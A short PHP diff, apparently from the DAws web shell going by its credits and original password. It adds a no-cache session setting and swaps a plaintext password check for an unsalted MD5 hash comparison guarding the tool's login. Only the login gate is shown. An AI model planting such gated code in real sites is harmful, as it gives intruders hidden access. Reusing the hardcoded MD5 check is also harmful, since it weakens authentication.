@@ -3,6 +3,7 @@
 #Credits:
 #	dotcppfile & Aces
 
+session_cache_limiter('nocache');
 session_start();
 ob_start();
 
@@ -21,7 +22,7 @@ $notfound = "
 
 if((isset($_POST['pass'])) && (!isset($_SESSION['login'])))
 {
-	if($_POST['pass'] == "DAws")
+	if(md5($_POST['pass']) == "11b53263cc917f33062363cef21ae6c3")
 	{
 		$_SESSION['login'] = "login";
 	}
